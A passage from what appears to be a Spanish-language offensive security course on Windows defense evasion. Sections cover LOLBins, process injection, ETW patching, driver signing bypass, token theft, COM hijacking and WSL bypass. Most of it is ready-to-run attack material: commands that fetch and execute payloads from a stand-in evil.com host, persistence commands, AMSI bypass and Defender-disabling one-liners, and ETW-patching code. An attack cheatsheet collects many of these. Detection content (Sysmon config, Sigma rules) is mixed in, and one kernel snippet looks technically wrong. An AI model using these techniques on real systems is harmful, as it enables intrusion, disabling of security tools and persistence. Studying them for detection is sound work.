**Ejercicio 7.1:** Configura execution policy a Restricted. Prueba diferentes metodos de bypass.

**Ejercicio 7.2:** Crea un script PowerShell ofuscado que evade ScriptBlock Logging (carga desde base64 + IEX).

---

## 8. LOLBins

### 8.1 Que son los LOLBins?

LOLBins (Living Off The Land Binaries) son binarios firmados por Microsoft que pueden ser usados para ejecucion de codigo, descarga de archivos, bypass de controles, etc.

### 8.2 Ejecucion de Codigo

```cmd
# === WINDOWS BINARY EXECUTION ===

# rundll32.exe
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert(1)
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("...")
rundll32.exe advpack.dll,LaunchINFSection payload.inf

# mshta.exe
mshta.exe http://evil.com/payload.hta
mshta.exe javascript:alert(1)

# regsvr32.exe (bypass AppLocker + network)
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll

# cscript/wscript
cscript //nologo C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs http://evil.com/test
cscript //E:jscript //nologo evil.js

# msiexec.exe
msiexec /q /i http://evil.com/payload.msi
msiexec /y C:\evil.dll

# installutil.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U evil.dll

# msbuild.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe evil.csproj

# certutil.exe (tambien sirve para descargar)
certutil -urlcache -split -f http://evil.com/payload.exe payload.exe

# bitsadmin.exe
bitsadmin /transfer job /download /priority high http://evil.com/payload.exe C:\evil.exe
```

### 8.3 Descarga de Archivos

```cmd
# === FILE DOWNLOAD LOLBINS ===

# certutil
certutil -urlcache -f http://evil.com/evil.exe evil.exe
certutil -urlcache -split -f http://evil.com/evil.dll evil.dll

# bitsadmin
bitsadmin /transfer download /download /priority high http://evil.com/file.exe C:\evil.exe

# powershell (incluso bloqueado, single command)
powershell -c (New-Object Net.WebClient).DownloadFile('http://evil.com/e.exe','e.exe')
powershell -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1')

# wget (if available)
wget http://evil.com/payload.exe -O payload.exe

# curl (if available)
curl http://evil.com/payload.exe -o payload.exe

# net use + copy (from SMB)
net use Z: \\evil\share
copy Z:\payload.exe C:\evil.exe
net use Z: /delete

# FTP
echo open evil.com> ftp.txt
echo user>> ftp.txt
echo pass>> ftp.txt
echo get evil.exe>> ftp.txt
echo quit>> ftp.txt
ftp -s:ftp.txt

# mshta (download + execute)
mshta.exe http://evil.com/payload.hta

# also via IE COM object:
rundll32.exe ieframe.dll,OpenURL http://evil.com/payload.exe
```

### 8.4 [uac bypass](../raw/w1n-byp4ss3s.md#uac-bypass) LOLBins

```cmd
# === UAC BYPASS CON LOLBINS ===

# fodhelper (ya cubierto)
fodhelper.exe

# eventvwr
eventvwr.exe

# sdclt
sdclt.exe /id:DownloadUpgrade

# computerdefaults
computerdefaults.exe

# wsreset
wsreset.exe

# slui
slui.exe

# wbem
wbemtest.exe
```

### 8.5 Information Discovery LOLBins

```cmd
# === INFORMATION GATHERING ===

# systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System"

# whoami
whoami /all
whoami /priv

# net commands
net users
net localgroup
net localgroup Administrators
net group "Domain Admins" /domain
net share
net view
net view /domain
net use
net sessions
netstat -anob

# ipconfig
ipconfig /displaydns
ipconfig /all

# arp
arp -a

# route
route print

# nslookup
nslookup evil.com

# dsquery (Domain)
dsquery user
dsquery computer

# nltest (Domain)
nltest /domain_trusts
nltest /dclist:[domain]
```

### 8.6 Persistence LOLBins

```cmd
# === PERSISTENCE VIA LOLBINS ===

# schtasks (task scheduler)
schtasks /create /tn "EvilTask" /tr "C:\evil.exe" /sc ONLOGON /ru SYSTEM
schtasks /run /tn "EvilTask"

# sc (service control)
sc create EvilService binPath= "C:\evil.exe" start= auto
sc start EvilService

# wmic
wmic /output:C:\evil.exe PROCESS call create "C:\evil.exe"
wmic startup call create "C:\evil.exe", "C:\evil.exe", , , 2

# reg
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Evil /t REG_SZ /d "C:\evil.exe"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Evil /t REG_SZ /d "C:\evil.exe"

# powershell (persistence)
powershell -c "New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name Evil -Value C:\evil.exe"
```

### 8.7 LOLBins Mas Usados por Malware

| Binario | Proposito | Frecuencia |
|---------|-----------|------------|
| [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell).exe | Ejecucion, descarga | Muy alto |
| cmd.exe | Ejecucion de comandos | Muy alto |
| wmic.exe | Informacion, ejecucion | Alto |
| certutil.exe | Descarga/decodificacion | Alto |
| bitsadmin.exe | Descarga | Medio |
| mshta.exe | Ejecucion HTML/JS | Medio |
| rundll32.exe | Ejecucion DLL | Medio |
| regsvr32.exe | Bypass + descarga | Medio |
| msiexec.exe | Instalacion MSI | Bajo |
| msbuild.exe | Compilacion/eject | Bajo |
| installutil.exe | Ejecucion .NET | Bajo |
| cscript.exe | Ejecucion VBS/JS | Medio |
| bginfo.exe | Ejecucion config | Bajo |

### 8.8 Deteccion de LOLBins

```powershell
# Como detectar uso malicioso de LOLBins:

# 1. Procesos padre anormales
# cmd.exe o powershell.exe iniciados por Office (winword.exe, excel.exe)
# o por explorer.exe (desde doumento)

# 2. Argumentos sospechosos
# certutil -urlcache (descarga)
# regsvr32 /s /n /u /i (bypass + SCT remoto)
# mshta http:// (ejecucion remota)
# powershell -enc (encoded command)

# 3. Horarios inusuales
# procesos normales ejecutandose en horarios no laborales

# 4. Sysmon EventID 1 reglas:
# - certutil.exe con "-urlcache" o "-split"
# - regsvr32.exe con argumentos largos
# - mshta.exe con URL externa
# - bitsadmin.exe con "/download"

# 5. EventID 4688 con ParentName sospechoso:
# - Office creando cmd.exe
# - Adobe Reader creando powershell.exe
```

### 8.9 Ejercicios Practicos

**Ejercicio 8.1:** Crea una cadena de LOLBins que: descargue un archivo, lo decodifique, y lo ejecute. Todo usando solo binarios de Microsoft.

**Ejercicio 8.2:** Configura [sysmon](../raw/3dr-3v4s10n.md#sysmon) para detectar uso malicioso de certutil, regsvr32, y mshta. Prueba y verifica las alertas.

---

## 9. [process injection](../raw/3dr-3v4s10n.md#process-injection)

### 9.1 Tipos de Process Injection

```csharp
// 1. Classic DLL Injection
// CrearRemoteThread -> LoadLibrary

// 2. Reflective DLL Injection
// Cargar DLL desde memoria sin tocar disco

// 3. Process Hollowing
// Reemplazar codigo de proceso legitimo

// 4. APC Injection
// QueueUserAPC a thread existente

// 5. Thread Hijacking
// SuspendThread + SetThreadContext + ResumeThread

// 6. Atom Bombing
// GlobalAtom -> AddAtom -> GetAtomName -> shellcode

// 7. Extra Window Memory Injection
// Usar EWM de ventanas de explorer

// 8. Process Doppelganging
// Transaccion NTFS para cargar seccion

// 9. PROPagate Injection
// Usar Window Properties de ventanas de Explorer
```

### 9.2 Classic [dll injection](../raw/3dr-3v4s10n.md#dll-injection)

```csharp
// Pasos:
// 1. OpenProcess (PROCESS_ALL_ACCESS)
// 2. VirtualAllocEx (allocar memoria en target)
// 3. WriteProcessMemory (escribir path DLL)
// 4. CreateRemoteThread (start LoadLibrary con path)

[DllImport("kernel32.dll")]
static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
[DllImport("kernel32.dll")]
static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
[DllImport("kernel32.dll")]
static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")]
static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
[DllImport("kernel32.dll")]
static extern IntPtr GetModuleHandle(string lpModuleName);
```

### 9.3 Reflective DLL Injection

```csharp
// Ventajas:
// - No usar LoadLibrary (no aparece en DLL list)
// - DLL nunca esta en disco
// - DLL resuelve sus propios imports
// - No deja rastro en Process Environment Block

// Componentes del reflective loader:
// 1. Mapear PE en memoria
// 2. Resolver imports (IAT)
// 3. Aplicar relocations
// 4. Llamar DllMain con DLL_PROCESS_ATTACH
// 5. Iniciar thread si es necesario
```

### 9.4 Process Hollowing Implementation

```csharp
// 1. CreateProcess suspendido (ej: svchost.exe)
// 2. NtUnmapViewOfSection (descargar codigo original)
// 3. VirtualAllocEx (asignar memoria)
// 4. WriteProcessMemory (escribir payload)
// 5. SetThreadContext (apuntar a payload entrypoint)
// 6. ResumeThread (ejecutar)

// Deteccion:
// - Sysmon EventID 8: CreateRemoteThread
// - Sysmon EventID 1: proceso con command line inusual
// - Volatility malfind: VADs con RWX
// - Desajuste ImageFileName vs PEB ImageBase
```

### 9.5 APC Injection

```csharp
// APC injection usa QueueUserAPC en lugar de CreateRemoteThread
// Menos detectado por EDRs

// 1. OpenThread en proceso target (THREAD_SET_CONTEXT)
// 2. VirtualAllocEx en proceso target
// 3. WriteProcessMemory (shellcode)
// 4. QueueUserAPC (pointer a shellcode)

// El shellcode se ejecuta cuando el thread entra en alertable state
// SleepEx, WaitForMultipleObjectsEx, etc.

// Deteccion:
// - Sysmon EventID 10: ProcessAccess
// - Comportamiento: threads entrando en estado alertable sin razon
```

### 9.6 Process Doppelganging

```csharp
// Tecnica avanzada que evita CreateRemoteThread:
// 1. Crear transaccion NTFS (NtCreateTransaction)
// 2. Crear archivo temporal en la transaccion
// 3. Escribir payload en la transaccion
// 4. Crear seccion desde el archivo transaccionado
// 5. Crear proceso desde la seccion (NtCreateProcessEx)
// 6. El proceso existe en un contexto transaccionado
// 7. Rollback: el archivo "original" nunca se modifica

// Ventajas:
// - Sin CreateRemoteThread
// - Sin VirtualAllocEx en proceso remoto
// - Sin WriteProcessMemory
// - El payload nunca esta en disco
```

### 9.7 Inyeccion en .NET (CLR Injection)

```powershell
# CLR Injection: Forzar a un proceso a cargar .NET runtime
# y ejecutar assembly

# Usar unmanaged PowerShell:
$CreateInterface = @"
using System;
using System.Runtime.InteropServices;
public class Native {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(...);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(...);
    // ... etc
}
"@
Add-Type $CreateInterface

# Luego inyectar CLR en proceso target
# Usar ICLRMetaHost, ICLRRuntimeInfo, ICLRRuntimeHost
```

### 9.8 Deteccion de Process Injection

```powershell
# Que monitorear:

# 1. API calls sospechosas
# - OpenProcess con PROCESS_ALL_ACCESS
# - VirtualAllocEx con RWX
# - WriteProcessMemory
# - CreateRemoteThread

# 2. Sysmon reglas
# EventID 8: CreateRemoteThread (con mapping a DLL inyectada)
# EventID 10: ProcessAccess (buscar ALL_ACCESS)
# EventID 1: Proceso hijo anormal

# 3. Memory analysis
# - VADs con RWX
# - Codigo ejecutable no asociado a modulo
# - Thread start address fuera de modulo

# 4. Comportamiento
# - Proceso legitimo abriendo otro proceso
# - svchost.exe abriendo winlogon.exe (sospechoso)
# - explorer.exe abriendo cmd.exe
```

### 9.9 Ejercicios Practicos

**Ejercicio 9.1:** Implementa DLL injection clasica en un [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) de prueba (notepad.exe). Verifica que la DLL se carga exitosamente.

**Ejercicio 9.2:** Configura [sysmon](../raw/3dr-3v4s10n.md#sysmon) para detectar CreateRemoteThread. Prueba tu inyeccion y verifica que genera el alerta.

**Ejercicio 9.3:** Implementa APC injection como alternativa no detectada por CreateRemoteThread.

---

## 10. [etw](../raw/3dr-3v4s10n.md#etw) Evasion

### 10.1 ETW como Mecanismo de Deteccion

```bash
# ETW es usado por EDRs para monitorear:
# - Process creation
# - Network connections
# - File operations
# - Registry changes
# - PowerShell execution
# - DLL loading

# Para evadir deteccion, hay que deshabilitar ETW
# o parchear las funciones que envian eventos
```

### 10.2 ETW Patching

```csharp
// ETW tiene funciones clave en ntdll y kernel32:
// EtwEventWrite - Escribe evento ETW
// EtwEventRegister - Registra provider
// EtwEventUnregister - Desregistra provider

// Parche simple:
// Modificar EtwEventWrite para retornar 0 (ERROR_SUCCESS)

// En C#:
[DllImport("kernel32.dll")]
static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32.dll")]
static extern IntPtr GetModuleHandle(string lpModuleName);
[DllImport("kernel32.dll")]
static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

void PatchETW() {
    IntPtr ntdll = GetModuleHandle("ntdll.dll");
    IntPtr etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
    
    // Cambiar permisos para escribir
    uint old;
    VirtualProtect(etwEventWrite, 1, 0x40, out old);  // PAGE_EXECUTE_READWRITE
    
    // Escribir ret (0xC3) para que la funcion no haga nada
    Marshal.WriteByte(etwEventWrite, 0xC3);
}
```

### 10.3 [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) ETW Evasion

```powershell
# PowerShell tiene su propio ETW provider
# Microsoft-Windows-PowerShell

# Evasion:
# 1. Deshabilitar ETW en sesion actual
$script = @"
[DllImport("kernel32.dll")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32.dll")]
public static extern IntPtr GetModuleHandle(string lpModuleName);
[DllImport("kernel32.dll")]
public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
"@
Add-Type -Name Native -MemberDefinition $script

$ntdll = [Native]::GetModuleHandle("ntdll.dll")
$etwEventWrite = [Native]::GetProcAddress($ntdll, "EtwEventWrite")

$old = 0
[Native]::VirtualProtect($etwEventWrite, 1, 0x40, [ref]$old)
[System.Runtime.InteropServices.Marshal]::WriteByte($etwEventWrite, 0xC3)
```

### 10.4 ETW Bypass via Registry

```powershell
# Deshabilitar ETW logging (requiere admin):

# Para .NET:
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\.NETFramework" `
    -Name "ETWEnabled" -Value 0 -Type DWord -Force

# Para PowerShell:
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell" `
    -Name "EnableScriptBlockLogging" -Value 0 -Type DWord -Force

# Nota: Estos cambios requieren reinicio o reinicio del proceso
```

### 10.5 Deteccion de ETW Patching

```bash
# Como detectar que ETW fue parcheado:

# 1. Verificar integridad de ntdll!EtwEventWrite
#    - Comparar codigo en disco vs en memoria
#    - Buscar 0xC3 (ret) al inicio de la funcion

# 2. Volatility apihooks:
vol -f memory.raw windows.apihooks

# 3. Verificar que los eventos ETW esperados existen
#    - Si no hay eventos de PowerShell pero PS se ejecuto
#    - Si no hay eventos de Process Creation
```

### 10.6 Ejercicios Practicos

**Ejercicio 10.1:** Parchea EtwEventWrite en [ntdll](../raw/w1n-1nt3rn4ls.md#ntdll) para deshabilitar ETW en una sesion de PowerShell. Verifica que no se generen eventos.

**Ejercicio 10.2:** Crea un detector de ETW patching que compare el codigo de ntdll!EtwEventWrite en memoria contra el original en disco.

---

## 11. [driver](../raw/k3rn3l-h4ck1ng.md#windows-drivers) Signing Bypass

### 11.1 Driver Signing Requirements

```bash
# Desde Windows 10 1607+:
# Todos los drivers deben estar firmados WHQL
# Solo administradores pueden instalar drivers
# Secure Boot evita drivers sin firmar

# Niveles de firma de drivers:
# 1. No firmado - Bloqueado
# 2. Test signed - Solo en test mode
# 3. Cross-signed (legacy) - Deprecado
# 4. WHQL signed - Aceptado en production
```

### 11.2 Test Mode

```cmd
# Activar test signing mode:
bcdedit /set testsigning on
# Luego firmar drivers con certificado de prueba

# Crear certificado de prueba:
makecert -r -pe -ss PrivateCertStore -n "CN=TestCert" TestCert.cer
# Firmar driver:
signtool sign /a /v /s PrivateCertStore /n TestCert driver.sys
```

### 11.3 Bypass via Vulnerable Drivers

```cmd
# Usar drivers firmados vulnerables (BYOVD):
# El driver vulnerabilidades como:
# - Arbitrary MSR write
# - Arbitrary physical memory read/write
# - Kernel memory leak
# - Callback registration

# Drivers conocidos:
# gdrv.sys (Gigabyte)
# iqvw64e.sys (Intel)
# aswArPots.sys (Avast)
# mhyprot2.sys (Genshin Impact anti-cheat)
```

### 11.4 DSE (Driver Signature Enforcement) Bypass

```c
// DSE puede ser deshabilitado desde kernel:
// 1. Parchear nt!CiValidateImageHeader
// 2. Modificar g_CiEnabled/g_CiOptions

// Si se tiene kernel access (via driver vulnerable):
// nt!g_CiOptions:
// 0x0: DSE deshabilitado
// 0x4: DSE habilitado (Win10+)
// 0x6: DSE habilitado + Secure Boot

// Para deshabilitar:
UINT64 ciOptions = FindPattern("nt!g_CiOptions");
WriteMsr(MSR_LSTAR, ciOptions);  // Escribir 0 para deshabilitar
```

### 11.5 Ejercicios Practicos

**Ejercicio 11.1:** Encuentra un driver vulnerable firmado (BYOVD). Documenta como podria ser usado para deshabilitar DSE.

---

## 12. Token Manipulation

### 12.1 Token Theft

```csharp
// Robar token de proceso con privilegios:

// 1. OpenProcess con TOKEN_DUPLICATE
// 2. OpenProcessToken (obtener token handle)
// 3. DuplicateTokenEx (duplicar como impersonation)
// 4. ImpersonateLoggedOnUser (asumir identidad)

[DllImport("advapi32.dll")]
static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
[DllImport("advapi32.dll")]
static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);
[DllImport("advapi32.dll")]
static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
[DllImport("advapi32.dll", SetLastError = true)]
static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);
```

### 12.2 Token Impersonation

```csharp
// Crear token de SYSTEM (requiere SeDebugPrivilege):
// 1. Encontrar PID de proceso SYSTEM
// 2. OpenProcess + OpenProcessToken
// 3. DuplicateTokenEx como Primary
// 4. CreateProcessAsUser con el token

// Mas simple: usar NamedPipe Impersonation
// 1. Crear named pipe
// 2. Conectar desde proceso de alta integridad
// 3. ImpersonateNamedPipeClient -> SYSTEM token
```

### 12.3 Ejercicios Practicos

**Ejercicio 12.1:** Implementa token theft robando el token de un [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) SYSTEM y usandolo para crear un [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) con altos privilegios.

---

## 13. Defensa y Deteccion

### 13.1 Estrategia de Defensa

```powershell
# Defensa en profundidad contra evasion:

# 1. WDAC / AppLocker
# - Politicas de allow listing
# - No solo deny listing

# 2. ASR Rules (Attack Surface Reduction)
Set-MpPreference -AttackSurfaceReductionRules_Ids <GUID> -AttackSurfaceReductionRules_Actions Enabled

# ASR Reglas utiles:
# - Block executable content from email
# - Block Office from creating child processes
# - Block credential stealing from LSASS
# - Block process creations from PSExec
# - Block untrusted unsigned processes

# 3. AMSI + Defender
# - Mantener actualizado
# - Cloud-delivered protection activada
# - Tamper Protection activada

# 4. Event Logging
# - PowerShell ScriptBlock Logging
# - PowerShell Transcription
# - Sysmon con config completa
# - Windows Event Log forwarding a SIEM

# 5. User training
# - No desactivar protecciones
# - Reportar phishing
```

### 13.2 [sysmon](../raw/3dr-3v4s10n.md#sysmon) Config Recomendada

```xml
<Sysmon>
  <EventFiltering>
    <!-- Process Creation -->
    <RuleGroup name="ProcessCreation" groupRelation="or">
      <ProcessCreate onmatch="include">
        <!-- Detectar process injection -->
        <Rule name="Technique=T1055" condition="contains">CreateRemoteThread</Rule>
        <Rule name="Technique=T1055.012" condition="contains">QueueUserAPC</Rule>
        
        <!-- Detectar LOLBins -->
        <CommandLine name="Technique=T1218" condition="contains">certutil -urlcache</CommandLine>
        <CommandLine name="Technique=T1218" condition="contains">regsvr32 /s /n /u /i</CommandLine>
        <CommandLine name="Technique=T1218" condition="contains">mshta http</CommandLine>
        <CommandLine name="Technique=T1218" condition="contains">bitsadmin /transfer</CommandLine>
        
        <!-- Detectar UAC bypass -->
        <CommandLine name="Technique=T1548" condition="contains">fodhelper.exe</CommandLine>
        <CommandLine name="Technique=T1548" condition="contains">eventvwr.exe</CommandLine>
      </ProcessCreate>
    </RuleGroup>
    
    <!-- Network connections -->
    <RuleGroup name="NetworkConnect" groupRelation="or">
      <NetworkConnect onmatch="include">
        <!-- Detectar C2 -->
        <DestinationPort name="Technique=T1071" condition="is">443</DestinationPort>
        <DestinationPort name="Technique=T1571" condition="is">8443</DestinationPort>
      </NetworkConnect>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

### 13.3 [mitre att&ck](../raw/s3c-f0nd4m3nt0s.md#mitre-attck) Mapping

```
Tactica: Defense Evasion (TA0005)
├── T1548: Abuse Elevation Control Mechanism
│   ├── T1548.002: Bypass User Account Control
│   
├── T1562: Impair Defenses
│   ├── T1562.001: Disable or Modify Tools (Defender)
│   ├── T1562.006: Indicator Blocking (ETW/AMSI)
│   ├── T1562.010: Downgrade Attack
│   
├── T1055: Process Injection
│   ├── T1055.001: Dynamic-link Library Injection
│   ├── T1055.002: Portable Executable Injection
│   ├── T1055.003: Thread Execution Hijacking
│   ├── T1055.004: Asynchronous Procedure Call
│   ├── T1055.012: Process Hollowing
│   
├── T1218: Signed Binary Proxy Execution
│   ├── T1218.002: Control Panel (rundll32)
│   ├── T1218.005: Mshta
│   ├── T1218.007: Msiexec
│   ├── T1218.010: Regsvr32
│   ├── T1218.011: Rundll32
│   ├── T1218.014: MMC
│   
├── T1553: Subvert Trust Controls
│   ├── T1553.002: Code Signing
│   
├── T1622: Debugger Evasion
├── T1497: Virtualization/Sandbox Evasion
```

### 13.4 Detection Rules ([sigma](../raw/thr3t-hnt.md#sigma))

```yaml
# Sigma rule: AMSI bypass via amsiInitFailed
title: PowerShell AMSI Bypass
id: abcdef01-1234-5678-9012-abcdef012345
status: experimental
description: Detects AMSI bypass via amsiInitFailed field modification
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains:
            - 'amsiInitFailed'
            - 'AmsiUtils'
            - 'amsiScanBuffer'
    condition: selection
falsepositives:
    - Legitimate administrative scripts
level: high
```

```yaml
# Sigma rule: UAC Bypass via fodhelper
title: UAC Bypass via Registry Modification
id: abcdef02-1234-5678-9012-abcdef012346
logsource:
    category: registry_event
    product: windows
detection:
    selection:
        TargetObject|contains:
            - '\ms-settings\shell\open\command'
            - '\mscfile\shell\open\command'
    condition: selection
level: high
```

### 13.5 Ejercicio Final Integrador

**Ejercicio 13.1 (Proyecto Final):**
1. Configura un sistema Windows con: WDAC, AppLocker, ASR rules, Sysmon, [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) logging
2. Intenta ejecutar un [payload](../raw/m3t4spl01t.md#payloads) simulando ser un atacante:
   - [uac bypass](../raw/w1n-byp4ss3s.md#uac-bypass) -> Fodhelper
   - [amsi bypass](../raw/3dr-3v4s10n.md#amsi-bypass) -> amsiInitFailed
   - Defender evasion -> XOR + reflection
   - Code execution -> InstallUtil LOLBin
   - [process injection](../raw/3dr-3v4s10n.md#process-injection) -> CreateRemoteThread en explorer
3. Documenta que alertas se generan y cuales tecnicas son detectadas

**Ejercicio 13.2:** Crea un script de PowerShell que detecte todas las tecnicas de evasion (UAC, [amsi](../raw/3dr-3v4s10n.md#amsi), [etw](../raw/3dr-3v4s10n.md#etw), etc.) analizando el estado del sistema.

---

## 14. Apéndice: Cheatsheet

```bash
# === UAC BYPASS ===
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d cmd.exe /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute
fodhelper.exe

reg add HKCU\Software\Classes\mscfile\shell\open\command /d cmd.exe /f
eventvwr.exe

# === AMSI BYPASS ===
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
reg add HKCU\Software\Microsoft\Windows Script\Settings /v AmsiEnable /t REG_DWORD /d 0 /f

# === DEFENDER DISABLE ===
Set-MpPreference -DisableRealtimeMonitoring $true
sc stop WinDefend
MpCmdRun -RemoveDefinitions -All
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

# === LOLBINS ===
certutil -urlcache -f http://evil.com/evil.exe evil.exe
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll
mshta http://evil.com/payload.hta
rundll32 javascript:"\..\mshtml,RunHTMLApplication ";eval(...
bitsadmin /transfer job /download http://evil.com/evil.exe evil.exe
msiexec /q /i http://evil.com/payload.msi
InstallUtil /logfile= /U evil.dll
MSBuild evil.csproj

# === PROCESS INJECTION ===
# C#: OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread
# C#: OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> QueueUserAPC

# === ETW PATCH ===
# ntdll!EtwEventWrite: Escribir 0xC3 (ret) al inicio

# === TOKEN ===
whoami /priv
# SeDebugPrivilege habilitado -> robar token de SYSTEM

# === WDAC/CI ===
# HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy -> Disabled=1
# bcdedit /set testsigning on
```

### Referencias

- [mitre att&ck](../raw/s3c-f0nd4m3nt0s.md#mitre-attck): [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://attack.mitre.org/
- LOLBins Project: https://lolbas-project.github.io/
- PowerSploit: https://github.[com](../raw/w1n-s9bsyst3ms.md#com)/PowerShellMafia/PowerSploit
- [sysmon](../raw/3dr-3v4s10n.md#sysmon): https://docs.microsoft.com/en-us/sysinternals/downloads/[sysmon](../raw/3dr-3v4s10n.md#sysmon)
- [sigma](../raw/thr3t-hnt.md#sigma) Rules: https://github.com/SigmaHQ/[sigma](../raw/thr3t-hnt.md#sigma)
- [uac bypass](../raw/w1n-byp4ss3s.md#uac-bypass) Research: https://github.com/hfiref0x/UACME
- [amsi bypass](../raw/3dr-3v4s10n.md#amsi-bypass) Research: https://github.com/S3cur3Th1sSh1t/[amsi](../raw/3dr-3v4s10n.md#amsi)-Bypass-[powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell)

## 15. [com](../raw/w1n-s9bsyst3ms.md#com) Hijacking

### 15.1 Que es COM?

COM (Component Object Model) es el framework de componentes de Windows. Las aplicaciones registran CLSIDs que apuntan a DLLs/EXEs.

```powershell
# Un atacante puede reemplazar registros COM para ejecutar codigo
# cuando una aplicacion legitima intenta crear un objeto COM

# Ubicacion de registros COM:
# HKLM\SOFTWARE\Classes\CLSID\{GUID}
# HKCU\Software\Classes\CLSID\{GUID}

# Ejemplo de hijacking:
# 1. Buscar CLSID que no existe en HKLM
# 2. Crear en HKCU apuntando a payload
# 3. Cuando la aplicacion intenta crear el objeto, carga nuestra DLL

# Script de deteccion:
$clsid_path = "HKCU:\Software\Classes\CLSID"
$suspicious = @()
Get-ChildItem $clsid_path -ErrorAction SilentlyContinue | ForEach-Object {
    $clsid = $_.PSChildName
    $inproc = Get-ItemProperty "$clsid_path\$clsid\InprocServer32" -ErrorAction SilentlyContinue
    if ($inproc -and $inproc.'(default)' -notlike "C:\Windows\*") {
        $suspicious += [PSCustomObject]@{
            CLSID = $clsid
            Path = $inproc.'(default)'
        }
    }
}
```

## 16. WSL Bypass

### 16.1 WSL como Vector

```bash
# Windows Subsystem for Linux permite ejecutar binarios Linux
# Puede ser usado para evadir controles de Windows

# Instalar WSL:
wsl --install -d Ubuntu

# Ejecutar herramientas de Linux desde Windows:
wsl python3 -c "import socket; print(socket.gethostname())"

# Acceso a disco de Windows desde WSL:
# /mnt/c/Windows/System32/

# Bypass de AppLocker:
# AppLocker no bloquea binarios de Linux
# wsl.exe corre como proceso de Windows pero ejecuta codigo Linux
wsl ./payload.elf

# Bypass de AMSI:
# AMSI no monitorea scripts de bash
wsl bash -c "curl http://evil.com/payload.sh | bash"
```

## 17. .NET Remoting Abuse

### 17.1 Abuso de .NET Remoting

```powershell
# .NET Remoting permite comunicacion remota entre AppDomains
# Puede ser abusado para ejecucion remota

# Crear servidor remoto:
Add-Type @"
using System;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;
public class RemoteServer : MarshalByRefObject {
    public void Execute(string cmd) {
        System.Diagnostics.Process.Start(cmd);
    }
}
"@

$channel = New-Object System.Runtime.Remoting.Channels.Tcp.TcpChannel(8080)
[System.Runtime.Remoting.Channels.ChannelServices]::RegisterChannel($channel)
[System.Runtime.Remoting.RemotingConfiguration]::RegisterWellKnownServiceType(
    [RemoteServer], "Execute", "SingleCall"
)

# Cliente:
$remote = [Activator]::GetObject([RemoteServer], "tcp://target:8080/Execute")
$remote.Execute("calc.exe")
```

## 18. Advanced Technique: DLL Proxying

### 18.1 DLL Proxying

```c
// DLL proxying: reemplazar una DLL legitima con una que
// pasa las exportaciones al original pero ejecuta codigo extra

// 1. Encontrar DLL que carga la aplicacion
// 2. Copiar DLL original con otro nombre
// 3. Crear DLL falsa con mismo nombre
// 4. La DLL falsa exporta todo (pasando a la original)
// 5. En DllMain, ejecutar payload extra

// Estructura basica:
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Ejecutar payload
